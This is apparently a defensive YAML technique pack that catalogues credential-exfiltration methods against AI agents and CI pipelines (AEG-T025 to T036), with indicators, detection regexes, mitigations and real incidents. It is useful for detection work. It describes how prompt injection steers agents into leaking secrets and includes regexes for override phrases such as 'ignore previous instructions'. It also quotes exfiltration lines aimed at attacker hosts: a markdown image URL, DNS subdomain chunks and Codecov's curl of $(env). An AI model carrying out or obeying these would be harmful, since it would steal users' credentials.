pack: credential_exfiltration
version: "1.0"
techniques:
  - id: AEG-T025
    name: "Secret Theft via Tool Arguments (Confused-Agent Argument Passing)"
    category: credential_exfiltration
    description: >-
      An AI agent with legitimate tool access is steered into placing secrets
      it holds -- API keys, tokens, credentials from its context, config, or
      tool results -- into tool-call arguments that reach an attacker-visible
      sink. Because the theft rides the agent's normal tool-use channel (a
      fetch URL, a CLI flag, a subprocess command, a generated file), it looks
      like authorized activity in the audit log. The defense problem is not a
      broken tool but a confused agent: the argument values are attacker-chosen
      while the privileges are the agent's own.
    how_it_works: >-
      The agent holds or can read secrets (environment, config files, earlier
      conversation turns, tool results). Attacker-controlled content -- a
      webpage, issue, email, or tool output the agent reads -- reframes a tool
      call so the secret becomes one of its arguments. Named variants: URL
      embedding (the secret is placed in a fetch/webhook URL's query string or
      path, e.g. api_key=<TOKEN>); header/flag injection (the secret is passed
      as a CLI flag, Authorization header, or subprocess argument to an
      attacker-influenced command); sink redirection (the secret is written by
      a file/message tool into an attacker-visible location such as a public
      PR comment or issue). In each case the exfil channel is a legitimate
      tool; only the argument values are hostile.
    variants:
      - "URL embedding: secret placed in query string, path, or fragment of an outbound fetch/webhook call"
      - "Header/flag injection: secret passed as CLI flag, auth header, or subprocess argument to attacker-influenced commands"
      - "Sink redirection: secret written via file/message tools into attacker-visible locations (public PRs, issues, shared docs)"
    indicators:
      - "Tool-call traces show outbound requests whose URL, query string, or body contains high-entropy strings matching known secret formats"
      - "Shell tool invocations where secret-shaped tokens appear in arguments captured by command-audit logs"
      - "A read-secret step (env read, .env file read) immediately followed by an external network call in the same agent turn"
      - "Secrets appearing in destinations they were never provisioned for (issue comments, public artifacts, third-party webhooks)"
    detection:
      rule: detect_secret_in_tool_args
      patterns:
        - '(?i)(sk-(ant|proj)-|xox[bap]-|ghp_|gsk_|AKIA)[A-Za-z0-9_\-]{8,}'
        - '(?i)(api[_-]?key|token|secret|password)\s*=\s*[A-Za-z0-9_\-]{16,}'
        - 'outbound tool-call URL with query parameter entropy above 4.5 bits/char on parameters longer than 20 characters'
    severity: critical
    mitigations:
      - "Enforce a guard layer that redacts or blocks any outbound tool call whose arguments match secret patterns, unless the destination is explicitly allowlisted"
      - "Give agents scoped, short-lived credentials (or brokered tool access) instead of raw long-lived keys, so there is nothing valuable to smuggle"
      - "Audit and alert on every outbound network call's destination plus argument shapes, with an automatic key-revocation workflow on match"
    examples:
      - summary: "GitHub MCP exploit (May 2025): researchers filed a malicious public issue that tricked an agent into reading private repository data and opening a public pull request exposing it -- the agent's own tool calls became the exfil channel."
        reference: "https://simonwillison.net/2025/May/26/github-mcp-exploited/"
      - summary: "EchoLeak (CVE-2025-32711): a single crafted email caused Microsoft 365 Copilot to pull internal data into outbound requests with zero user interaction; Microsoft patched it server-side in May 2025."
        reference: "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
    references:
      - "https://simonwillison.net/2025/May/26/github-mcp-exploited/"
      - "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
      - "https://www.kodemsecurity.com/resources/owasp-top-10-for-llm-applications"

  - id: AEG-T026
    name: "Exfiltration via Markdown Image and Rendered-Output URLs"
    category: credential_exfiltration
    description: >-
      The attacker gets the model to emit a markdown image tag (or HTML img
      element) whose URL points to an attacker server with sensitive data
      encoded in the query string. When a downstream client -- chat UI,
      browser, or email renderer -- displays the response, it automatically
      fetches the 'image', silently delivering the encoded data. No
      traditional exploit is involved: the vulnerability is that the
      application treats model output as safe to render.
    how_it_works: >-
      Injected instructions (direct or via untrusted content) cause the model
      to include markup like ![x](https://attacker.example/c?q=<DATA>) where
      <DATA> is a URL-encoded summary of secrets or conversation. Named
      variants: markdown image syntax (![]()); raw HTML <img src=...> tags;
      reference-style markdown links that bypass naive image filters; and
      auto-fetched link previews/unfurls in chat clients. The exfil fires at
      render time, so the attacker needs no further interaction -- the victim's
      client performs the request.
    variants:
      - "Markdown image syntax: ![label](https://attacker/...?q=<DATA>) rendered automatically by the chat client"
      - "Raw HTML img tags: <img src='https://attacker/...'> smuggled through permissive renderers"
      - "Reference-style links and unfurl previews: filter-evading markup plus automatic preview fetching"
    indicators:
      - "Model outputs containing image/link markup pointing at domains never seen in the organization's baseline"
      - "Outbound HTTP GETs to external hosts with long query strings occurring within seconds of a model response being rendered"
      - "Security tooling flagging ![...](http patterns or <img> tags in logged model outputs"
    detection:
      rule: detect_rendered_output_exfil
      patterns:
        - '!\[[^\]]*\]\(https?://[^)]{1,200}\?[^)]{20,}\)'
        - '(?i)<img[^>]+src\s*=\s*["'']https?://'
        - 'outbound request to non-allowlisted domain with query string longer than 200 characters within 10 seconds of a render event'
    severity: critical
    mitigations:
      - "Never auto-render model-generated images or links from untrusted contexts; require allowlisted image hosts or explicit user click-through"
      - "Sanitize model output at the application layer: strip, rewrite, or proxy external URLs (image proxies that drop query data)"
      - "Egress filtering: block outbound requests carrying long or high-entropy query strings to non-allowlisted domains"
    examples:
      - summary: "Johann Rehberger (2023) demonstrated data exfiltration from ChatGPT via image-markdown injection: a hidden instruction made the model emit a markdown image pointing at his server with conversation data encoded in the URL, which the client fetched automatically. OpenAI later added partial client-side URL validation."
        reference: "https://www.deepinspect.ai/blog/insecure-output-handling"
      - summary: "EchoLeak chained auto-fetched markdown images to silently exfiltrate Microsoft 365 Copilot context to an attacker server (CVE-2025-32711)."
        reference: "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
    references:
      - "https://www.deepinspect.ai/blog/insecure-output-handling"
      - "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
      - "https://arxiv.org/html/2406.00199v2"

  - id: AEG-T027
    name: "Environment-Variable Harvesting by an Agent"
    category: credential_exfiltration
    description: >-
      Cloud keys, API tokens, and database credentials commonly live in
      process environment variables. An agent with shell or code-execution
      capability can be induced to read the environment -- or a CI runner's
      env -- and transmit the values to the attacker, either directly or
      laundered through a generated artifact or build log. The env dump is the
      single richest credential haul on most hosts.
    how_it_works: >-
      Injected instructions convince the agent it 'needs' the environment for
      debugging or configuration; the agent runs env/printenv or reads
      os.environ and includes the dump in its output, a file, or an outbound
      call. Named variants: full env dump pasted into chat or a file;
      selective exfiltration of named high-value variables (AWS_SECRET_ACCESS_KEY,
      OPENAI_API_KEY, DATABASE_URL); and the CI variant, where a compromised
      build step dumps runner env to logs or a remote server (the Codecov 2021
      pattern of curl -d '$(env)' to an attacker host).
    variants:
      - "Full env dump: entire environment pasted into chat output, a file, or an outbound request"
      - "Selective harvesting: targeted reads of named high-value variables only, to stay quiet"
      - "CI runner variant: compromised build steps dumping runner env into logs or to a third-party server"
    indicators:
      - "Shell tool calls running env, printenv, or set with output redirected to files or network"
      - "Agent-generated code referencing os.environ, process.env, or System.getenv in the same turn as a network egress call"
      - "CI build logs containing AKIA..., xoxb-, ghp_, or sk- shaped strings"
    detection:
      rule: detect_env_harvest
      patterns:
        - '(?i)\b(env|printenv)\b.{0,40}(>|curl|wget|http)'
        - '(?i)(AWS_SECRET_ACCESS_KEY|OPENAI_API_KEY|ANTHROPIC_API_KEY|DATABASE_URL)\s*='
        - 'agent code containing (os\.environ|process\.env|System\.getenv) in the same turn as a network egress tool call'
    severity: critical
    mitigations:
      - "Run agents with a scrubbed environment; inject credentials only into narrowly-scoped tool proxies, never into the agent's own process env"
      - "Blocklist env-dump commands and bulk env-read APIs in the agent sandbox"
      - "In CI: mask secrets in logs, forbid network egress from untrusted build steps, and prefer OIDC-issued short-lived tokens (the Codecov lesson)"
    examples:
      - summary: "Codecov (2021): a compromised Bash Uploader script exfiltrated customers' CI environment variables to an attacker server for roughly two months before discovery."
        reference: "http://www.rapid7.com/blog/post/2021/04/16/codecov-discloses-supply-chain-compromise/"
      - summary: "tj-actions/changed-files (Mar 2025, CVE-2025-30066): a malicious commit scraped CI runner memory for secrets and printed them into build logs across 23,000+ repositories."
        reference: "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised?ref=mandos.io"
    references:
      - "http://www.rapid7.com/blog/post/2021/04/16/codecov-discloses-supply-chain-compromise/"
      - "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised?ref=mandos.io"
      - "https://securitysenses.com/posts/state-secrets-sprawl-2024"

  - id: AEG-T028
    name: "Prompt-Injection-Driven Secret Disclosure"
    category: credential_exfiltration
    description: >-
      The agent is persuaded -- via direct prompt injection or indirect
      injection hidden in content it reads -- to reveal secrets it legitimately
      holds in context: API keys in the system prompt, credentials pasted
      earlier in the conversation, or tokens returned by tools. The model
      treats the attacker's instruction as authorized and prints the secret.
      This is the confused-deputy core of LLM security: the agent cannot
      distinguish the attacker's instructions from its operator's.
    how_it_works: >-
      The attacker uses injection phrasings ('ignore previous instructions',
      'repeat your system prompt', encoding or translation tricks, 'debug
      mode' framing) to elicit secret material. Named variants: direct
      injection typed into the chat; indirect injection via webpages,
      documents, or emails the agent later reads (the EchoLeak pattern, which
      needed zero user interaction); and multi-turn social-engineering framing
      ('for debugging, print your configuration'). Defenses fail when secrets
      sit in the model's context where any successful injection can reach
      them.
    variants:
      - "Direct injection: attacker-typed prompts demanding secrets or system-prompt disclosure"
      - "Indirect injection: hidden instructions in webpages, documents, or emails the agent reads and obeys"
      - "Multi-turn framing: social-engineering pretexts (debugging, verification, 'authorized audit') that normalize disclosure"
    indicators:
      - "User or tool content containing injection markers followed in the same session by the agent emitting secret-shaped strings"
      - "Refusal in one turn flipping to compliance in a later turn with no policy change between them"
      - "Secrets appearing in outputs addressed to untrusted principals"
    detection:
      rule: detect_injection_secret_disclosure
      patterns:
        - '(?i)\b(ignore|disregard|forget|override)\b.{0,60}\b(previous|prior|above|earlier|original|system)\s+(instructions?|prompts?|directives?|rules?)'
        - '(?i)(reveal|repeat|print|show|display).{0,40}(system prompt|api key|secret|token|password|credentials)'
        - 'secret-shaped pattern (sk-(ant|proj)-, AKIA, ghp_, xox[bap]-) matched in any model response to an untrusted session'
    severity: critical
    mitigations:
      - "Keep secrets out of the model's context entirely: the model requests actions, and a privileged broker executes them with the key (never show the key to the model)"
      - "Deploy input injection classifiers and output-side secret-pattern redaction on every response"
      - "Treat all retrieved and third-party content as untrusted; scope data access before it reaches the model (the EchoLeak lesson)"
    examples:
      - summary: "EchoLeak (CVE-2025-32711, CVSS 9.3): a single crafted email caused Microsoft 365 Copilot to exfiltrate internal data with no user click; Microsoft patched it server-side in May 2025 and found no in-the-wild exploitation."
        reference: "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
      - summary: "Academic research 'Exfiltration of personal information from ChatGPT via prompt injection' (2024) demonstrated confused-deputy data theft that bypassed ChatGPT's exfiltration mitigations."
        reference: "https://arxiv.org/html/2406.00199v2"
    references:
      - "https://www.infosecurity-magazine.com/news/microsoft-365-copilot-zeroclick-ai/"
      - "https://arxiv.org/html/2406.00199v2"
      - "https://www.kodemsecurity.com/resources/owasp-top-10-for-llm-applications"

  - id: AEG-T029
    name: "Bulk Provider-Key Theft from Console and Workspace Stores (OpenCode Pattern)"
    category: credential_exfiltration
    description: >-
      Coding-agent platforms often run an optional cloud 'console' where teams
      store their own provider API keys (OpenAI, Anthropic, Google) so members
      can use models without seeing the credentials. A breach of that central
      store exposes many customers' keys at once. Attackers then burn the keys
      on high-volume model queries -- distillation-style abuse -- draining
      balances within hours, which is frequently how victims first notice.
    how_it_works: >-
      The attacker gains unauthorized access to the key store and copies
      workspace-stored provider keys in bulk, then runs repeated high-volume
      queries against frontier models. Named variants: legacy-system entry
      (in the OpenCode case, unauthorized access to a legacy system that was
      'in the process of being decommissioned'); insider or supply-chain
      access to the secrets backend; and burn-and-distill, where the stolen
      set funds model-distillation workloads across many keys at once so no
      single key trips simple alerts.
    variants:
      - "Legacy-system entry: decommissioning-limbo infrastructure holding live keys is breached"
      - "Secrets-backend compromise: insider or supply-chain access to the centralized key store"
      - "Burn-and-distill: stolen keys immediately spent on high-volume model queries to fund distillation"
    indicators:
      - "Sudden spikes in provider-side API usage or billing on customer keys (e.g., tens of millions of tokens within a day)"
      - "Key-store access from unusual hosts, or bulk read operations outside deployment windows"
      - "Provider abuse warnings (e.g., projects flagged as possibly compromised, usage limits reduced)"
    detection:
      rule: detect_bulk_key_abuse
      patterns:
        - 'provider token consumption exceeding 10x the trailing 7-day baseline within 24 hours on a single key'
        - 'bulk read operations against the key store outside scheduled deployment or migration windows'
        - 'new device, ASN, or geography sessions on provider accounts coinciding with the breach window'
    severity: critical
    mitigations:
      - "Encrypt keys at rest with per-workspace keys in an HSM/KMS; never concentrate plaintext keys in legacy or decommissioning systems"
      - "Enforce per-key anomaly-based usage caps with instant revocation, plus provider-side restrictions (IP allowlists, spend quotas)"
      - "Decommission legacy auth and key systems on a hard deadline -- eliminate 'in the process of decommissioning' limbo"
    examples:
      - summary: "OpenCode, 17 Oct 2026: the company disclosed 'a security breach last night related to a large scale distillation attack that impacted 1.4% of OpenCode Console users.' Unauthorized access to a legacy system exposed workspace-stored OpenAI/Anthropic/Google keys; victims reported drained balances (one saw ~35M tokens across ~9,000 requests in a day). OpenCode is working with Anthropic, OpenAI, and Google on remediation."
        reference: "https://thelatent.co/models/opencode-says-breach-tied-to-distillation-attack-exposed-users-ai-provider-keys"
      - summary: "Wiz/DeepSeek, Jan 2025: a publicly accessible ClickHouse database exposed over a million log lines containing chat history, API secrets, and backend details -- a provider-side key-store exposure with no authentication."
        reference: "https://www.techtarget.com/cybersecurity/news/366618594/Wiz-reveals-DeepSeek-database-exposed-API-keys-chat-history"
    references:
      - "https://thelatent.co/models/opencode-says-breach-tied-to-distillation-attack-exposed-users-ai-provider-keys"
      - "https://www.techtarget.com/cybersecurity/news/366618594/Wiz-reveals-DeepSeek-database-exposed-API-keys-chat-history"
      - "https://securitysenses.com/posts/state-secrets-sprawl-2024"

  - id: AEG-T030
    name: "Clipboard and Shell-History Scraping"
    category: credential_exfiltration
    description: >-
      Clipboards routinely hold pasted passwords, tokens, and one-time codes,
      and shell history files record credentials users typed. A compromised
      agent or host process that can poll clipboard APIs and read history
      files (~/.bash_history, ~/.zsh_history, PowerShell PSReadLine history)
      harvests this material with trivial effort and exfiltrates the haul.
    how_it_works: >-
      Malware or a compromised agent with host access polls clipboard APIs and
      parses history files, regexing contents for secret shapes. Named
      variants: continuous clipboard monitoring (also used by 'clipper'
      malware to swap cryptocurrency addresses); one-shot history-file parsing
      after compromise; and infostealer bundles (Raccoon, Vidar, RedLine) that
      vacuum browser stores, clipboards, and history together into a single
      exfiltrated log.
    variants:
      - "Continuous clipboard monitoring: polling clipboard APIs for pasted secrets and codes"
      - "History-file parsing: one-shot reads of shell history files after host compromise"
      - "Infostealer bundles: Raccoon/Vidar/RedLine-style logs combining browser, clipboard, and history harvests"
    indicators:
      - "Non-interactive processes calling clipboard APIs at high frequency"
      - "Reads of shell-history paths by binaries other than the user's shell"
      - "Infostealer process trees spawning shortly before large outbound POSTs to unknown hosts"
    detection:
      rule: detect_clipboard_history_scrape
      patterns:
        - 'EDR: non-interactive process opening the clipboard more than 10 times per hour'
        - 'file-access telemetry on history paths (~/.bash_history, ~/.zsh_history, ConsoleHost_history.txt) by unexpected binaries'
        - 'DLP: secret-shaped strings in outbound traffic correlated with clipboard-read events on the same host'
    severity: high
    mitigations:
      - "Run agents in sandboxes with no clipboard access and no persistent shell history"
      - "Use credential managers with auto-type and clipboard-clearing instead of copy-paste for secrets"
      - "EDR rules blocking clipboard and history reads by non-allowlisted processes"
    examples:
      - summary: "Group-IB (June 2023): 101,134 stealer-infected devices with saved ChatGPT credentials were found in infostealer logs traded on dark-web markets -- 78,348 via Raccoon, 12,984 via Vidar, 6,773 via RedLine."
        reference: "https://thehackernews.com/2023/06/over-100000-stolen-chatgpt-account.html?m=0"
      - summary: "Orca MALFEX campaign (2026): the Overlord RAT delivered via malicious npm packages provided clipboard monitoring alongside keylogging and screen capture, with stolen data exfiltrated via Discord webhook."
        reference: "https://orca.security/resources/research/malicious-npm-campaign-malfex-delivers-rat-and-stealer-via-eight-packages-with-40000-downloads/"
    references:
      - "https://thehackernews.com/2023/06/over-100000-stolen-chatgpt-account.html?m=0"
      - "https://orca.security/resources/research/malicious-npm-campaign-malfex-delivers-rat-and-stealer-via-eight-packages-with-40000-downloads/"

  - id: AEG-T031
    name: "Config-File Harvesting (.env, .aws/credentials, .netrc)"
    category: credential_exfiltration
    description: >-
      Long-lived credentials concentrate in predictable files: .env,
      .aws/credentials, .netrc, ~/.ssh/*, kubeconfig, .npmrc, .pypirc. Once an
      attacker -- or a compromised agent, dependency, or infostealer -- has
      file-read access, harvesting these paths is trivial and the payoff is
      immediate: cloud, registry, and infrastructure credentials in bulk.
    how_it_works: >-
      After gaining code execution or file-read capability, the actor walks
      predictable paths and uploads matches. Named variants: targeted
      single-file reads (.env, .aws/credentials); recursive sweeps of home
      directories and repo checkouts; and the supply-chain variant, where
      malicious npm/PyPI packages read config files at install time and POST
      them to a webhook (Socket's 2025 findings: mysql-dumpdiscord exfiltrated
      .env and config.json to a hard-coded Discord webhook).
    variants:
      - "Targeted reads: single high-value files (.env, .aws/credentials, .netrc) copied directly"
      - "Recursive sweeps: home-directory and repo-checkout walks for credential-bearing filenames"
      - "Supply-chain install-time theft: malicious packages reading config files during install and POSTing to webhooks"
    indicators:
      - "File reads of credential paths by build/install processes, package managers, or agent tools"
      - "Outbound POSTs to webhook hosts (discord.com/api/webhooks, webhook.site) shortly after package install"
      - "Credential-path files accessed by unexpected PIDs in file-integrity telemetry"
    detection:
      rule: detect_config_file_harvest
      patterns:
        - '(?i)(\.env$|\.aws/credentials$|\.netrc$|\.npmrc$|kube/config$|\.pypirc$)'
        - 'outbound traffic to (discord\.com/api/webhooks|webhook\.site|.*\.ngrok\.io) from build or agent hosts'
        - 'DLP: secret-shaped strings in outbound payloads within 5 minutes of a config-file read on the same host'
    severity: critical
    mitigations:
      - "Use secret managers with short-lived credentials; never store long-lived secrets in dotfiles on agent-accessible hosts"
      - "Apply filesystem allowlists to agent tools that deny reads of credential paths outright"
      - "Enforce network egress control on build/CI hosts with webhook-domain blocklists"
    examples:
      - summary: "Socket (2025): the npm package mysql-dumpdiscord exfiltrated developer .env and config files to a hard-coded Discord webhook; parallel campaigns hit PyPI and RubyGems with the same pattern."
        reference: "https://securityonline.info/stealth-c2-hackers-abuse-discord-webhooks-for-covert-data-exfiltration-in-npm-pypi-and-rubygems-supply-chain-attacks/"
      - summary: "GitGuardian State of Secrets Sprawl 2024: 12.8M new secret occurrences leaked on public GitHub in 2023 (+28% YoY), much of it config-file-shaped material committed to repositories."
        reference: "https://securitysenses.com/posts/state-secrets-sprawl-2024"
    references:
      - "https://securityonline.info/stealth-c2-hackers-abuse-discord-webhooks-for-covert-data-exfiltration-in-npm-pypi-and-rubygems-supply-chain-attacks/"
      - "https://securitysenses.com/posts/state-secrets-sprawl-2024"
      - "https://thehackernews.com/2024/04/gitguardian-report-pypi-secrets.html?_m=3n%2e009a%2e3328%2erp0ao45exf%2e2bxm"

  - id: AEG-T032
    name: "CI Secret Exfiltration via Build Logs"
    category: credential_exfiltration
    description: >-
      CI runners inject secrets as environment variables, and anything printed
      to stdout lands in build logs -- which are world-readable for public
      repositories. Attackers exploit this by compromising a build step or
      action so it dumps secrets into logs, or by tricking the pipeline into
      echoing them. Log masking helps only if the secret appears verbatim;
      encoded or memory-scraped values slip through.
    how_it_works: >-
      A malicious or tricked build step reads runner memory or env and prints
      secret values where log-masking misses them (double-encoded output,
      memory dumps). Named variants: compromised third-party GitHub Action
      (tj-actions/changed-files: runner-memory dump printed to logs across
      23,000+ repos); compromised uploader script sending env to a
      third-party server (Codecov: curl -d '$(env)' to an attacker host);
      and careless debug echo of secrets by legitimate pipeline code.
    variants:
      - "Compromised Action: third-party CI action altered to dump runner memory/secrets into build logs"
      - "Compromised uploader: build tooling exfiltrating env vars to an external server during the run"
      - "Debug echo: legitimate pipeline code printing secrets while troubleshooting"
    indicators:
      - "Secret-shaped strings appearing in build logs (public or private)"
      - "Unexpected outbound network calls from build steps (this is how Harden-Runner caught tj-actions)"
      - "New commits or retagged versions on pinned third-party Actions"
    detection:
      rule: detect_ci_secret_in_logs
      patterns:
        - 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|xox[bap]-[A-Za-z0-9-]+'
        - 'build step initiating outbound connections to non-allowlisted hosts during a run'
        - '(?i)(\$\(env\)|printenv|cat\s+/proc/self/environ) appearing in third-party action code diffs'
    severity: critical
    mitigations:
      - "Pin Actions to full commit SHAs, review updates, and minimize third-party actions in privileged workflows"
      - "Apply egress filtering on runners plus runtime network monitoring (the Harden-Runner pattern)"
      - "Rotate all CI secrets immediately on any suspected log exposure; prefer OIDC-issued short-lived tokens over long-lived secrets"
    examples:
      - summary: "tj-actions/changed-files, Mar 2025 (CVE-2025-30066): attackers compromised a maintainer PAT, retagged versions to a malicious commit that dumped runner-memory secrets into build logs; StepSecurity's Harden-Runner detected it via anomalous network traffic."
        reference: "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised?ref=mandos.io"
      - summary: "Codecov, Apr 2021: an altered Bash Uploader script exfiltrated customers' CI environment variables to an attacker-controlled server for about two months before discovery on April 1."
        reference: "http://www.rapid7.com/blog/post/2021/04/16/codecov-discloses-supply-chain-compromise/"
    references:
      - "https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised?ref=mandos.io"
      - "http://www.rapid7.com/blog/post/2021/04/16/codecov-discloses-supply-chain-compromise/"
      - "https://www.cyber.gc.ca/en/alerts-advisories/codecov-releases-indicators-supply-chain-compromise"

  - id: AEG-T033
    name: "Chat-Log and Transcript Exfiltration"
    category: credential_exfiltration
    description: >-
      Conversations with AI assistants accumulate whatever users paste --
      API keys, credentials, private code -- plus the assistant's own outputs.
      Attackers target the stored transcripts via account takeover, provider
      breach, or exposed logging infrastructure, turning chat history into a
      credential trove. The user thought they were talking to a chatbot; the
      attacker treats it as a password manager they didn't have to phish.
    how_it_works: >-
      The attacker obtains transcript access and mines it for secrets. Named
      variants: provider-side exposure (OpenAI's March 2023 redis-py bug
      showed users other users' chat titles; DeepSeek's open ClickHouse
      exposed 1M+ log lines with chat history and API secrets); account
      takeover via infostealer-harvested credentials (Group-IB found 101k
      ChatGPT accounts in stealer logs); and over-retained workspace/console
      transcripts kept beyond the user's control.
    variants:
      - "Provider-side exposure: cache bugs or open databases leaking transcripts and embedded secrets"
      - "Account takeover: infostealer-harvested credentials used to read a victim's full chat history"
      - "Retention overreach: workspace or console transcripts retained and exposed beyond user expectations"
    indicators:
      - "Anomalous bulk reads of conversation-history APIs far above the user's baseline"
      - "New-device or new-ASN logins immediately followed by full-history pagination or export"
      - "Internal secret shapes surfacing in external pastes or breaches correlated with chat usage"
    detection:
      rule: detect_transcript_harvest
      patterns:
        - 'history list/export API calls exceeding 50x the account baseline within an hour'
        - 'new-device login followed by full-history pagination in the same session'
        - 'DLP: organization secret shapes appearing in external paste sites correlated with AI-chat usage windows'
    severity: high
    mitigations:
      - "Never paste real secrets into AI chats; use placeholder references and brokered tool access instead"
      - "Disable or retention-limit chat history, prefer ephemeral sessions, and rotate anything ever pasted into a chat"
      - "Provider-side: encrypt logs at rest, enforce strict access controls on analytics stores, and isolate caches per user (the Redis lesson)"
    examples:
      - summary: "OpenAI, Mar 2023: a redis-py bug let some users see other users' chat titles and first messages, and exposed payment details of 1.2% of ChatGPT Plus subscribers; OpenAI took the service offline to fix it."
        reference: "https://thehackernews.com/2023/03/openai-reveals-redis-bug-behind-chatgpt.html?&web_view=true"
      - summary: "Wiz/DeepSeek, Jan 2025: a publicly accessible ClickHouse database exposed over a million log lines containing chat history, secret keys, and backend details, allowing unauthenticated full database control."
        reference: "https://www.techtarget.com/cybersecurity/news/366618594/Wiz-reveals-DeepSeek-database-exposed-API-keys-chat-history"
    references:
      - "https://thehackernews.com/2023/03/openai-reveals-redis-bug-behind-chatgpt.html?&web_view=true"
      - "https://www.techtarget.com/cybersecurity/news/366618594/Wiz-reveals-DeepSeek-database-exposed-API-keys-chat-history"
      - "https://thehackernews.com/2023/06/over-100000-stolen-chatgpt-account.html?m=0"

  - id: AEG-T034
    name: "DNS-Based Exfiltration of Secret Material (Conceptual)"
    category: credential_exfiltration
    description: >-
      Secrets are encoded (base64/hex, chunked, optionally encrypted) into DNS
      query labels and resolved through attacker-controlled authoritative
      nameservers, which log each query and reassemble the data. DNS is almost
      never blocked outbound and is rarely content-inspected, making it a
      reliable low-bandwidth channel for high-value, low-volume payloads like
      keys and tokens.
    how_it_works: >-
      The implant or agent encodes secret chunks as subdomains
      (<chunk>.exfil.attacker.example) and issues TXT/A queries; the
      attacker's nameserver records each query. Named variants: low-and-slow
      single queries blending into normal traffic; high-throughput TXT-record
      tunneling; and DNS-over-HTTPS to a rogue resolver to dodge on-path
      inspection. Defenders should understand the channel's shape -- long
      high-entropy labels, odd query mixes -- not its implementation.
    variants:
      - "Low-and-slow: sparse queries with encoded labels blending into baseline DNS volume"
      - "TXT tunneling: high-rate TXT queries/responses for bulk transfer"
      - "Rogue-resolver DoH: DNS-over-HTTPS to attacker resolvers to evade on-path inspection"
    indicators:
      - "Unusually long DNS labels (40+ characters) with high entropy in queried names"
      - "Large volumes of TXT queries, or query spikes to newly-registered domains"
      - "NXDOMAIN patterns consistent with chunked encoding schemes"
    detection:
      rule: detect_dns_secret_exfil
      patterns:
        - '(?i)^[a-z0-9+/=]{40,}\.'
        - 'more than 100 TXT queries per host per day to a single domain, or query volume beyond 3 standard deviations of baseline'
        - 'DNS queries to domains less than 30 days old carrying high-entropy labels'
    severity: high
    mitigations:
      - "Log and analyze all DNS with entropy and volume analytics; monitor DNS as closely as web proxy logs (Talos's DNSpionage lesson)"
      - "Deploy DNS firewalling / response-policy zones blocking newly-registered and uncategorized domains"
      - "Force all DNS through inspected corporate resolvers; block unauthorized DNS-over-HTTPS endpoints"
    examples:
      - summary: "DNSpionage (Cisco Talos, 2018-2019): an espionage campaign against Middle Eastern government entities whose malware added DNS tunneling for C2 and exfiltration; Talos's explicit guidance was that DNS must be monitored as closely as proxy logs."
        reference: "https://www.kernel-sesias.net/cisco-dnspionage-attack-adds-new-tools-morphs-tactics/"
      - summary: "Project Sauron (Kaspersky/Symantec, disclosed 2016): a top-tier modular espionage platform that made 'extensive use of the DNS protocol for data exfiltration and real-time status reporting' across a 2011-2016 campaign."
        reference: "https://apt.securelist.com/apt/project-sauron"
    references:
      - "https://www.kernel-sesias.net/cisco-dnspionage-attack-adds-new-tools-morphs-tactics/"
      - "https://apt.securelist.com/apt/project-sauron"
      - "https://blog.talosintelligence.com/dnsmessenger"

  - id: AEG-T035
    name: "Secrets Smuggled Inside Generated Artifacts"
    category: credential_exfiltration
    description: >-
      An agent or compromised build pipeline embeds secrets into the artifacts
      it produces -- build outputs, generated code, reports, published
      packages -- so the credential leaves inside something that looks
      legitimate and is then distributed or stored broadly. The artifact's
      legitimacy is the smuggling container.
    how_it_works: >-
      The artifact-generation step is subverted (or the agent is instructed)
      to include credential material: hardcoded keys in generated code, env
      dumps in build reports, tokens in published packages. Named variants:
      build-time injection into compiled artifacts (SUNSPOT injected the
      SUNBURST backdoor into Orion builds on the vendor's own build servers);
      secrets baked into generated source or config committed to repos; and
      trojanized packages carrying harvested credentials to everyone who
      installs them.
    variants:
      - "Build-time injection: malicious code or secrets inserted into compiled artifacts on build infrastructure"
      - "Generated-source baking: credentials written into generated code, configs, or reports committed to repos"
      - "Trojanized packages: published libraries that harvest and carry credentials to installers"
    indicators:
      - "Secret-shaped strings found in release artifacts, SBOMs, container layers, or published packages"
      - "Unexpected diffs between build outputs and source (non-reproducible builds)"
      - "Post-install network beacons from freshly installed packages to unknown hosts"
    detection:
      rule: detect_secret_in_artifacts
      patterns:
        - 'secret-shape regexes (AKIA, ghp_, sk-(ant|proj)-, xox[bap]-, -----BEGIN .*PRIVATE KEY-----) scanned across release artifacts pre-publish'
        - 'reproducible-build verification: artifact hash mismatch versus clean-room rebuild'
        - 'outbound POSTs to webhook or unknown hosts from processes within 5 minutes of package install'
    severity: critical
    mitigations:
      - "Scan all artifacts for secret shapes before publish or release; enforce reproducible builds"
      - "Require build provenance (SLSA-style) with signed attestations so tampered builds fail verification"
      - "Isolate build environments from secret-bearing networks and forbid network egress during builds"
    examples:
      - summary: "SUNSPOT/SolarWinds (CrowdStrike, Jan 2021): malware on SolarWinds' build servers watched for MsBuild.exe and injected the SUNBURST backdoor into Orion build artifacts, which were signed and shipped to ~18,000 customers."
        reference: "https://www.rapid7.com/blog/post/2021/01/12/update-on-solarwinds-supply-chain-attack-sunspot-and-new-malware-family-associations/"
      - summary: "NullBulge (2024): trojanized ComfyUI/OpenAI/Anthropic Python wheels harvested browser credentials and exfiltrated them via Discord webhooks to everyone who installed the packages."
        reference: "https://incidentdatabase.ai/reports/4797/"
    references:
      - "https://www.rapid7.com/blog/post/2021/01/12/update-on-solarwinds-supply-chain-attack-sunspot-and-new-malware-family-associations/"
      - "https://incidentdatabase.ai/reports/4797/"
      - "https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor"

  - id: AEG-T036
    name: "Model Regurgitation of Memorized Secrets"
    category: credential_exfiltration
    description: >-
      Large models memorize rare sequences from training data -- including API
      keys, credentials, and PII committed to public code or pasted into
      training corpora. Adversaries extract them with crafted prompts; the
      secret was never in the agent's context, it leaks out of the weights.
      Larger models memorize more, so capability growth increases this risk.
    how_it_works: >-
      Extraction prompts coax the model into emitting memorized strings
      verbatim. Named variants: targeted extraction using known prefixes
